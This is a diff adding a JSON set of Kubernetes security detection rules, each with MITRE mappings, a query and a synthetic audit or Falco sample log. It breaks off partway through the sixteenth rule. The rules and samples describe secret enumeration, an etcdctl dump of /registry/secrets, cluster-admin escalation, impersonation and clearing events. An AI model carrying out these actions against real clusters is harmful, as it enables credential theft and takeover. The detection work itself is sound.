@@ -1,0 +1,2292 @@
+[
+  {
+    "id": "KSU-001",
+    "name": "Anonymous Access to Kubernetes API Server",
+    "category": "Control Plane",
+    "severity": "Critical",
+    "confidence": 92,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Initial Access",
+      "Persistence"
+    ],
+    "mitre": [
+      {
+        "id": "T1133",
+        "name": "External Remote Services"
+      },
+      {
+        "id": "T1078.001",
+        "name": "Valid Accounts: Default Accounts"
+      }
+    ],
+    "description": "A request was authorised for the user system:anonymous or the group system:unauthenticated on a resource other than health endpoints. Anonymous auth combined with a permissive binding exposes the whole cluster to the internet.",
+    "detection": "source=k8s_audit user.username IN (\"system:anonymous\") OR \"system:unauthenticated\" IN user.groups | where responseStatus.code < 400 AND requestURI NOT IN (\"/healthz\",\"/livez\",\"/readyz\",\"/version\")",
+    "falsePositives": "Load balancer health checks against /healthz, /livez or /readyz.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "5c7e9f9a-3b1d-4a0e-9b8f-1f2a6d1c0a11",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/namespaces/kube-system/secrets",
+      "verb": "list",
+      "user": {
+        "username": "system:anonymous",
+        "groups": [
+          "system:unauthenticated"
+        ]
+      },
+      "sourceIPs": [
+        "198.51.100.23"
+      ],
+      "userAgent": "python-requests/2.32.3",
+      "objectRef": {
+        "resource": "secrets",
+        "namespace": "kube-system",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestReceivedTimestamp": "2026-10-02T03:14:22.118204Z",
+      "annotations": {
+        "authorization.k8s.io/decision": "allow",
+        "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"anon-read\" of ClusterRole \"view-all\" to Group \"system:unauthenticated\""
+      }
+    }
+  },
+  {
+    "id": "KSU-002",
+    "name": "Ingress Controller Admission Webhook Exploitation (IngressNightmare)",
+    "category": "Network & Ingress",
+    "severity": "Critical",
+    "confidence": 85,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "CNI Flow Logs (Cilium Hubble / Calico)",
+      "Ingress-NGINX Controller Logs"
+    ],
+    "tactics": [
+      "Initial Access",
+      "Execution"
+    ],
+    "mitre": [
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell"
+      }
+    ],
+    "description": "Detects exploitation of the ingress-nginx admission webhook (CVE-2025-1974 family): AdmissionReview requests reaching the controller from a source other than the API server, followed by nginx loading a shared object from /proc or /tmp, or spawning a shell.",
+    "detection": "(flow.dst_pod LIKE \"ingress-nginx-controller-*\" AND flow.dst_port=8443 AND flow.src_identity != \"kube-apiserver\") OR (container.image LIKE \"*ingress-nginx/controller*\" AND (evt.type=openat AND fd.name LIKE \"/proc/*/fd/*\" AND fd.name ENDS_WITH \".so\") OR proc.name IN (sh,bash))",
+    "falsePositives": "Rare. Controller upgrades can briefly produce unusual nginx -t invocations, but never from non-API-server sources.",
+    "sampleLog": {
+      "time": "2026-10-02T08:11:43.201554Z",
+      "rule": "Ingress-NGINX Loads Shared Object From Untrusted Path",
+      "priority": "Critical",
+      "source": "syscall",
+      "output": "Shared library loaded by nginx from procfs (proc.cmdline=nginx -c /tmp/nginx/nginx-cfg1974 -t file=/proc/34/fd/12 container=ingress-nginx-controller-7d9c8b5f4-x2pqz)",
+      "output_fields": {
+        "proc.name": "nginx",
+        "proc.cmdline": "nginx -c /tmp/nginx/nginx-cfg1974 -t",
+        "fd.name": "/proc/34/fd/12",
+        "k8s.ns.name": "ingress-nginx",
+        "k8s.pod.name": "ingress-nginx-controller-7d9c8b5f4-x2pqz",
+        "container.image.repository": "registry.k8s.io/ingress-nginx/controller",
+        "container.image.tag": "v1.11.3"
+      },
+      "hostname": "worker-node-01",
+      "tags": [
+        "CVE-2025-1974",
+        "T1190",
+        "ingress"
+      ]
+    }
+  },
+  {
+    "id": "KSU-003",
+    "name": "Cluster-Admin ClusterRoleBinding Created",
+    "category": "Identity & RBAC",
+    "severity": "Critical",
+    "confidence": 90,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+    ],
+    "mitre": [
+      {
+        "id": "T1098.006",
+        "name": "Account Manipulation: Additional Container Cluster Roles"
+      },
+      {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    ],
+    "description": "A ClusterRoleBinding or RoleBinding granting cluster-admin (or another highly privileged ClusterRole) was created or patched. Attackers bind their user or a service account to cluster-admin to gain full control and persistence.",
+    "detection": "source=k8s_audit objectRef.resource IN (\"clusterrolebindings\",\"rolebindings\") verb IN (\"create\",\"update\",\"patch\") requestObject.roleRef.name IN (\"cluster-admin\",\"admin\",\"system:controller:*\") responseStatus.code < 400 | where user.username NOT IN (gitops_service_accounts)",
+    "falsePositives": "Cluster bootstrap, GitOps controllers (Argo CD / Flux) applying approved manifests, break-glass procedures.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "e2b4c6d8-1a3c-4e5f-8a9b-0c1d2e3f4a5b",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
+      "verb": "create",
+      "user": {
+        "username": "system:serviceaccount:dev:ci-runner",
+        "groups": [
+          "system:serviceaccounts",
+          "system:serviceaccounts:dev",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "10.244.3.17"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46",
+      "objectRef": {
+        "resource": "clusterrolebindings",
+        "name": "backup-admin",
+        "apiGroup": "rbac.authorization.k8s.io",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "kind": "ClusterRoleBinding",
+        "metadata": {
+          "name": "backup-admin"
+        },
+        "subjects": [
+          {
+            "kind": "ServiceAccount",
+            "name": "ci-runner",
+            "namespace": "dev"
+          }
+        ],
+        "roleRef": {
+          "apiGroup": "rbac.authorization.k8s.io",
+          "kind": "ClusterRole",
+          "name": "cluster-admin"
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T10:41:07.512331Z",
+      "annotations": {
+        "authorization.k8s.io/decision": "allow",
+        "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"ci-escalate\" of ClusterRole \"rbac-manager\""
+      }
+    }
+  },
+  {
+    "id": "KSU-004",
+    "name": "Wildcard RBAC Role or ClusterRole Created",
+    "category": "Identity & RBAC",
+    "severity": "High",
+    "confidence": 80,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+    ],
+    "mitre": [
+      {
+        "id": "T1098.006",
+        "name": "Account Manipulation: Additional Container Cluster Roles"
+      }
+    ],
+    "description": "A Role/ClusterRole was created or modified with wildcard verbs or resources, or with escalation verbs (escalate, bind, impersonate) — an effective admin role that bypasses review of cluster-admin bindings.",
+    "detection": "source=k8s_audit objectRef.resource IN (\"roles\",\"clusterroles\") verb IN (\"create\",\"update\",\"patch\") | where requestObject.rules{}.verbs{}=\"*\" OR requestObject.rules{}.resources{}=\"*\" OR requestObject.rules{}.verbs{} IN (\"escalate\",\"bind\",\"impersonate\")",
+    "falsePositives": "Operator / Helm chart installs (e.g. cert-manager, Prometheus operator) that ship broad roles.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "a7c1e3f5-2b4d-4f6a-9c8e-7d6b5a4c3e21",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/rbac.authorization.k8s.io/v1/clusterroles",
+      "verb": "create",
+      "user": {
+        "username": "jdoe@corp.example",
+        "groups": [
+          "platform-devs",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (darwin/arm64)",
+      "objectRef": {
+        "resource": "clusterroles",
+        "name": "support-tools",
+        "apiGroup": "rbac.authorization.k8s.io",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "kind": "ClusterRole",
+        "metadata": {
+          "name": "support-tools"
+        },
+        "rules": [
+          {
+            "apiGroups": [
+              "*"
+            ],
+            "resources": [
+              "*"
+            ],
+            "verbs": [
+              "*"
+            ]
+          }
+        ]
+      },
+      "requestReceivedTimestamp": "2026-10-02T11:02:55.903114Z"
+    }
+  },
+  {
+    "id": "KSU-005",
+    "name": "User Impersonation via Impersonate Headers",
+    "category": "Identity & RBAC",
+    "severity": "High",
+    "confidence": 78,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Privilege Escalation",
+      "Defense Evasion"
+    ],
+    "mitre": [
+      {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    ],
+    "description": "A request carried Impersonate-User / Impersonate-Group headers (audit field impersonatedUser), especially impersonating system:masters, a node identity or a privileged service account. Impersonation lets an identity act with someone else's permissions.",
+    "detection": "source=k8s_audit impersonatedUser.username=* | where impersonatedUser.groups{} IN (\"system:masters\") OR impersonatedUser.username LIKE \"system:node:*\" OR impersonatedUser.username LIKE \"system:serviceaccount:kube-system:*\"",
+    "falsePositives": "Platform admins legitimately using kubectl --as for troubleshooting; some dashboards/proxies (e.g. Rancher, Teleport) impersonate by design.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "0f9e8d7c-6b5a-4c3d-2e1f-0a9b8c7d6e5f",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/namespaces/kube-system/secrets/bootstrap-token-abcdef",
+      "verb": "get",
+      "user": {
+        "username": "system:serviceaccount:monitoring:grafana",
+        "groups": [
+          "system:serviceaccounts",
+          "system:authenticated"
+        ]
+      },
+      "impersonatedUser": {
+        "username": "admin",
+        "groups": [
+          "system:masters"
+        ]
+      },
+      "sourceIPs": [
+        "10.244.1.88"
+      ],
+      "userAgent": "curl/8.5.0",
+      "objectRef": {
+        "resource": "secrets",
+        "namespace": "kube-system",
+        "name": "bootstrap-token-abcdef",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestReceivedTimestamp": "2026-10-02T12:17:40.004921Z"
+    }
+  },
+  {
+    "id": "KSU-006",
+    "name": "Secrets Enumeration Across Namespaces",
+    "category": "Identity & RBAC",
+    "severity": "High",
+    "confidence": 82,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Credential Access",
+      "Discovery"
+    ],
+    "mitre": [
+      {
+        "id": "T1552.007",
+        "name": "Unsecured Credentials: Container API"
+      },
+      {
+        "id": "T1613",
+        "name": "Container and Resource Discovery"
+      }
+    ],
+    "description": "A user or service account listed/watched secrets cluster-wide, or read secrets in many namespaces within a short window. Typical of credential harvesting after initial access.",
+    "detection": "source=k8s_audit objectRef.resource=\"secrets\" verb IN (\"list\",\"watch\",\"get\") responseStatus.code=200 | stats dc(objectRef.namespace) AS ns_count, count AS reads BY user.username span=10m | where (ns_count >= 3 OR requestURI=\"/api/v1/secrets\") AND user.username NOT IN (secret_controllers)",
+    "falsePositives": "External Secrets Operator, Vault agent injectors, backup tools (Velero) and Argo CD.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "9d2c4b6a-8e0f-4a1c-b3d5-e7f901a2b3c4",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/secrets?limit=500",
+      "verb": "list",
+      "user": {
+        "username": "system:serviceaccount:web:frontend",
+        "groups": [
+          "system:serviceaccounts",
+          "system:serviceaccounts:web",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "10.244.2.41"
+      ],
+      "userAgent": "kubectl/v1.30.0 (linux/amd64)",
+      "objectRef": {
+        "resource": "secrets",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestReceivedTimestamp": "2026-10-02T13:05:12.661802Z"
+    }
+  },
+  {
+    "id": "KSU-007",
+    "name": "Service Account Token Used from Outside the Cluster",
+    "category": "Identity & RBAC",
+    "severity": "High",
+    "confidence": 86,
+    "logSources": [
+      "Kubernetes Audit Log",
+      "Cloud Audit Logs (CloudTrail / Azure Activity / GCP Audit)"
+    ],
+    "tactics": [
+      "Credential Access",
+      "Lateral Movement",
+      "Defense Evasion"
+    ],
+    "mitre": [
+      {
+        "id": "T1528",
+        "name": "Steal Application Access Token"
+      },
+      {
+        "id": "T1550.001",
+        "name": "Use Alternate Authentication Material: Application Access Token"
+      }
+    ],
+    "description": "A request authenticated as a service account (system:serviceaccount:*) originated from an IP outside the pod/node CIDRs. Service account tokens should only be used from inside the cluster; external use indicates a stolen token.",
+    "detection": "source=k8s_audit user.username LIKE \"system:serviceaccount:*\" | where NOT cidrmatch(\"10.244.0.0/16\", sourceIPs{0}) AND NOT cidrmatch(\"10.0.0.0/16\", sourceIPs{0}) | stats values(verb), values(objectRef.resource) BY user.username, sourceIPs{0}, userAgent",
+    "falsePositives": "CI/CD systems outside the cluster that intentionally use a long-lived service account token (should migrate to OIDC).",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "3a5c7e9b-1d2f-4a6b-8c0e-2f4a6c8e0b1d",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/pods",
+      "verb": "list",
+      "user": {
+        "username": "system:serviceaccount:payments:api-sa",
+        "uid": "4f1b2c3d-5e6f-7a8b-9c0d-1e2f3a4b5c6d",
+        "groups": [
+          "system:serviceaccounts",
+          "system:serviceaccounts:payments",
+          "system:authenticated"
+        ],
+        "extra": {
+          "authentication.kubernetes.io/pod-name": [
+            "payments-api-6c9f7d8b5-qv7lm"
+          ]
+        }
+      },
+      "sourceIPs": [
+        "185.220.101.34"
+      ],
+      "userAgent": "kubectl/v1.29.4 (windows/amd64)",
+      "objectRef": {
+        "resource": "pods",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestReceivedTimestamp": "2026-10-02T14:21:07.512331Z"
+    }
+  },
+  {
+    "id": "KSU-008",
+    "name": "CertificateSigningRequest Approved for Privileged Group",
+    "category": "Identity & RBAC",
+    "severity": "Critical",
+    "confidence": 88,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Credential Access"
+    ],
+    "mitre": [
+      {
+        "id": "T1649",
+        "name": "Steal or Forge Authentication Certificates"
+      }
+    ],
+    "description": "A CSR requesting a client certificate with O=system:masters or a system:node identity was created and approved by a non-controller identity. A signed client cert is a long-lived credential that survives token rotation and cannot be revoked easily.",
+    "detection": "source=k8s_audit objectRef.resource=\"certificatesigningrequests\" objectRef.subresource=\"approval\" verb IN (\"update\",\"patch\") | where user.username NOT LIKE \"system:kube-controller-manager\" | join objectRef.name [search verb=create objectRef.resource=certificatesigningrequests requestObject.spec.signerName=\"kubernetes.io/kube-apiserver-client\"]",
+    "falsePositives": "Manual onboarding of administrators via CSR workflow (should be rare and ticketed).",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "b1c2d3e4-f5a6-4b7c-8d9e-0f1a2b3c4d5e",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/certificates.k8s.io/v1/certificatesigningrequests/svc-backup/approval",
+      "verb": "update",
+      "user": {
+        "username": "ops-temp@corp.example",
+        "groups": [
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.77"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64)",
+      "objectRef": {
+        "resource": "certificatesigningrequests",
+        "name": "svc-backup",
+        "subresource": "approval",
+        "apiGroup": "certificates.k8s.io",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestObject": {
+        "spec": {
+          "signerName": "kubernetes.io/kube-apiserver-client",
+          "groups": [
+            "system:masters",
+            "system:authenticated"
+          ],
+          "username": "svc-backup"
+        },
+        "status": {
+          "conditions": [
+            {
+              "type": "Approved",
+              "status": "True",
+              "reason": "KubectlApprove"
+            }
+          ]
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T15:33:28.271650Z"
+    }
+  },
+  {
+    "id": "KSU-009",
+    "name": "Permission Probing – Burst of Forbidden (403) Responses",
+    "category": "Identity & RBAC",
+    "severity": "Medium",
+    "confidence": 65,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Discovery"
+    ],
+    "mitre": [
+      {
+        "id": "T1069",
+        "name": "Permission Groups Discovery"
+      },
+      {
+        "id": "T1613",
+        "name": "Container and Resource Discovery"
+      }
+    ],
+    "description": "A single identity receives many 403 Forbidden responses across different resources in a short time, or issues SelfSubjectAccessReview / SelfSubjectRulesReview requests (kubectl auth can-i --list) — typical of tools such as kube-hunter, peirates or manual post-exploitation recon.",
+    "detection": "source=k8s_audit (responseStatus.code=403 OR objectRef.resource IN (\"selfsubjectrulesreviews\",\"selfsubjectaccessreviews\")) | stats count, dc(objectRef.resource) AS res BY user.username, sourceIPs{0} span=5m | where count > 20 AND res > 5",
+    "falsePositives": "Misconfigured controllers after an RBAC change; developers exploring access with kubectl auth can-i.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "c4d5e6f7-a8b9-4c0d-9e1f-2a3b4c5d6e7f",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
+      "verb": "list",
+      "user": {
+        "username": "system:serviceaccount:web:frontend",
+        "groups": [
+          "system:serviceaccounts",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "10.244.2.41"
+      ],
+      "userAgent": "Go-http-client/1.1",
+      "objectRef": {
+        "resource": "clusterrolebindings",
+        "apiGroup": "rbac.authorization.k8s.io",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "status": "Failure",
+        "reason": "Forbidden",
+        "code": 403
+      },
+      "requestReceivedTimestamp": "2026-10-02T13:04:59.118742Z",
+      "annotations": {
+        "authorization.k8s.io/decision": "forbid",
+        "authorization.k8s.io/reason": ""
+      }
+    }
+  },
+  {
+    "id": "KSU-010",
+    "name": "kubectl exec / attach / debug into Pod",
+    "category": "Workload Activity",
+    "severity": "Medium",
+    "confidence": 60,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Execution"
+    ],
+    "mitre": [
+      {
+        "id": "T1609",
+        "name": "Container Administration Command"
+      }
+    ],
+    "description": "Interactive command execution inside a running pod via pods/exec, pods/attach or an ephemeral debug container (pods/ephemeralcontainers). Legitimate for operators but a primary hands-on-keyboard technique for attackers, especially in production namespaces.",
+    "detection": "source=k8s_audit objectRef.subresource IN (\"exec\",\"attach\",\"ephemeralcontainers\") verb IN (\"create\",\"get\",\"patch\",\"update\") responseStatus.code=101 OR responseStatus.code=200 | where objectRef.namespace IN (prod_namespaces) | stats count BY user.username, objectRef.namespace, objectRef.name, requestURI",
+    "falsePositives": "On-call engineers troubleshooting, liveness tooling and some CI pipelines. Tune per namespace and user group.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Request",
+      "auditID": "d5e6f7a8-b9c0-4d1e-af20-3b4c5d6e7f80",
+      "stage": "ResponseStarted",
+      "requestURI": "/api/v1/namespaces/payments/pods/payments-api-6c9f7d8b5-qv7lm/exec?command=%2Fbin%2Fsh&container=api&stdin=true&stdout=true&tty=true",
+      "verb": "create",
+      "user": {
+        "username": "contractor01@corp.example",
+        "groups": [
+          "contractors",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64)",
+      "objectRef": {
+        "resource": "pods",
+        "namespace": "payments",
+        "name": "payments-api-6c9f7d8b5-qv7lm",
+        "subresource": "exec",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 101
+      },
+      "requestReceivedTimestamp": "2026-10-02T16:48:03.551820Z"
+    }
+  },
+  {
+    "id": "KSU-011",
+    "name": "Exec into kube-system or Control-Plane Pod",
+    "category": "Workload Activity",
+    "severity": "High",
+    "confidence": 85,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Execution",
+      "Privilege Escalation"
+    ],
+    "mitre": [
+      {
+        "id": "T1609",
+        "name": "Container Administration Command"
+      },
+      {
+        "id": "T1611",
+        "name": "Escape to Host"
+      }
+    ],
+    "description": "pods/exec or pods/attach targeting pods in kube-system (CoreDNS, kube-proxy, CNI agents, etcd, static control-plane pods). These pods often run privileged with host access or powerful service account tokens.",
+    "detection": "source=k8s_audit objectRef.subresource IN (\"exec\",\"attach\") objectRef.namespace IN (\"kube-system\",\"kube-public\",\"calico-system\",\"cilium\") | where user.username NOT IN (break_glass_admins)",
+    "falsePositives": "Platform team debugging CNI/DNS issues during a declared incident.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Request",
+      "auditID": "e6f7a8b9-c0d1-4e2f-8a31-4c5d6e7f8091",
+      "stage": "ResponseStarted",
+      "requestURI": "/api/v1/namespaces/kube-system/pods/etcd-cp-node-01/exec?command=etcdctl&command=get&command=%2Fregistry%2Fsecrets&command=--prefix&container=etcd",
+      "verb": "create",
+      "user": {
+        "username": "jdoe@corp.example",
+        "groups": [
+          "platform-devs",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (darwin/arm64)",
+      "objectRef": {
+        "resource": "pods",
+        "namespace": "kube-system",
+        "name": "etcd-cp-node-01",
+        "subresource": "exec",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 101
+      },
+      "requestReceivedTimestamp": "2026-10-02T17:02:44.012583Z"
+    }
+  },
+  {
+    "id": "KSU-012",
+    "name": "Direct etcd Access from Unauthorized Client",
+    "category": "Control Plane",
+    "severity": "Critical",
+    "confidence": 87,
+    "logSources": [
+      "etcd Logs",
+      "CNI Flow Logs (Cilium Hubble / Calico)",
+      "Host Firewall / VPC Flow Logs"
+    ],
+    "tactics": [
+      "Credential Access",
+      "Discovery"
+    ],
+    "mitre": [
+      {
+        "id": "T1552.007",
+        "name": "Unsecured Credentials: Container API"
+      },
+      {
+        "id": "T1613",
+        "name": "Container and Resource Discovery"
+      }
+    ],
+    "description": "Connections to etcd client port 2379 (or peer port 2380) from any host other than the API servers / etcd peers, or TLS handshake rejections at etcd. etcd stores every Secret — direct access bypasses RBAC and audit logging entirely.",
+    "detection": "(source=flow dst_port IN (2379,2380) NOT src_ip IN (apiserver_ips, etcd_peer_ips)) OR (source=etcd msg IN (\"rejected connection on client endpoint\",\"rejected connection on peer endpoint\"))",
+    "falsePositives": "etcd backup jobs and monitoring scrapers (add their IPs to the allow-list).",
+    "sampleLog": "{\"level\":\"warn\",\"ts\":\"2026-10-02T18:20:01.442Z\",\"caller\":\"embed/config_logging.go:170\",\"msg\":\"rejected connection on client endpoint\",\"remote-addr\":\"10.244.2.41:51834\",\"server-name\":\"\",\"error\":\"tls: failed to verify certificate: x509: certificate signed by unknown authority\"}\nOct 02 18:20:03 cp-node-01 hubble[1123]: {\"time\":\"2026-10-02T18:20:03.117Z\",\"verdict\":\"FORWARDED\",\"IP\":{\"source\":\"10.244.2.41\",\"destination\":\"10.0.1.10\"},\"l4\":{\"TCP\":{\"source_port\":51840,\"destination_port\":2379,\"flags\":{\"SYN\":true}}},\"source\":{\"namespace\":\"web\",\"pod_name\":\"frontend-5f7d8c9b6-zt4kq\"},\"destination\":{\"labels\":[\"reserved:host\"]}}"
+  },
+  {
+    "id": "KSU-013",
+    "name": "Port-Forward or API Proxy Tunnel to Internal Service",
+    "category": "Network & Ingress",
+    "severity": "Low",
+    "confidence": 55,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Command and Control"
+    ],
+    "mitre": [
+      {
+        "id": "T1572",
+        "name": "Protocol Tunneling"
+      }
+    ],
+    "description": "Use of pods/portforward, services/proxy or nodes/proxy subresources to tunnel traffic through the API server into internal services (databases, admin UIs, kubelet) that are not exposed externally.",
+    "detection": "source=k8s_audit objectRef.subresource IN (\"portforward\",\"proxy\") | where objectRef.resource=\"nodes\" OR objectRef.namespace IN (prod_namespaces) | stats count BY user.username, objectRef.resource, objectRef.namespace, objectRef.name",
+    "falsePositives": "Developers port-forwarding to dev databases; metrics-server and dashboards using services/proxy.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Request",
+      "auditID": "f7a8b9c0-d1e2-4f3a-9b42-5d6e7f8091a2",
+      "stage": "ResponseStarted",
+      "requestURI": "/api/v1/namespaces/data/pods/postgres-0/portforward",
+      "verb": "create",
+      "user": {
+        "username": "contractor01@corp.example",
+        "groups": [
+          "contractors",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64)",
+      "objectRef": {
+        "resource": "pods",
+        "namespace": "data",
+        "name": "postgres-0",
+        "subresource": "portforward",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 101
+      },
+      "requestReceivedTimestamp": "2026-10-02T19:11:20.330915Z"
+    }
+  },
+  {
+    "id": "KSU-014",
+    "name": "Kubernetes Events Deleted",
+    "category": "Defense Evasion",
+    "severity": "Medium",
+    "confidence": 80,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Defense Evasion"
+    ],
+    "mitre": [
+      {
+        "id": "T1070",
+        "name": "Indicator Removal"
+      }
+    ],
+    "description": "Deletion of Event objects (core/v1 events or events.k8s.io) by a human or non-controller identity. Events reveal pod scheduling, image pulls and failures; deleting them hides attacker activity from operators.",
+    "detection": "source=k8s_audit objectRef.resource=\"events\" verb IN (\"delete\",\"deletecollection\") | where user.username NOT LIKE \"system:*\"",
+    "falsePositives": "Very rare; events expire automatically via TTL so manual deletion is unusual.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "a8b9c0d1-e2f3-4a4b-8c53-6e7f8091a2b3",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/namespaces/payments/events",
+      "verb": "deletecollection",
+      "user": {
+        "username": "contractor01@corp.example",
+        "groups": [
+          "contractors",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64)",
+      "objectRef": {
+        "resource": "events",
+        "namespace": "payments",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestReceivedTimestamp": "2026-10-02T19:40:51.778104Z"
+    }
+  },
+  {
+    "id": "KSU-015",
+    "name": "Mass Deletion of Workloads or Namespaces",
+    "category": "Workload Activity",
+    "severity": "Critical",
+    "confidence": 84,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Impact"
+    ],
+    "mitre": [
+      {
+        "id": "T1485",
+        "name": "Data Destruction"
+      },
+      {
+        "id": "T1489",
+        "name": "Service Stop"
+      }
+    ],
+    "description": "A single identity deletes namespaces, deployments, statefulsets, PVCs or PVs in volume within minutes — destructive impact or ransomware-style extortion against a cluster.",
+    "detection": "source=k8s_audit verb IN (\"delete\",\"deletecollection\") objectRef.resource IN (\"namespaces\",\"deployments\",\"statefulsets\",\"persistentvolumeclaims\",\"persistentvolumes\") responseStatus.code < 400 | stats count, dc(objectRef.namespace) BY user.username span=10m | where count >= 10 OR objectRef.resource=\"namespaces\"",
+    "falsePositives": "Ephemeral preview environments torn down by CI; planned decommissioning.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "b9c0d1e2-f3a4-4b5c-9d64-7f8091a2b3c4",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/namespaces/payments",
+      "verb": "delete",
+      "user": {
+        "username": "system:serviceaccount:dev:ci-runner",
+        "groups": [
+          "system:serviceaccounts",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "185.220.101.34"
+      ],
+      "userAgent": "kubectl/v1.29.4 (windows/amd64)",
+      "objectRef": {
+        "resource": "namespaces",
+        "name": "payments",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestReceivedTimestamp": "2026-10-02T20:03:10.009311Z"
+    }
+  },
+  {
+    "id": "KSU-016",
+    "name": "Privileged Pod Created",
+    "category": "Workload Configuration",
+    "severity": "High",
+    "confidence": 85,
+    "logSources": [
+      "Kubernetes Audit Log",
+      "Admission Controller (Kyverno / OPA Gatekeeper / PSA)"
+    ],
+    "tactics": [
+      "Execution",
+      "Privilege Escalation"
+    ],
+    "mitre": [
+      {
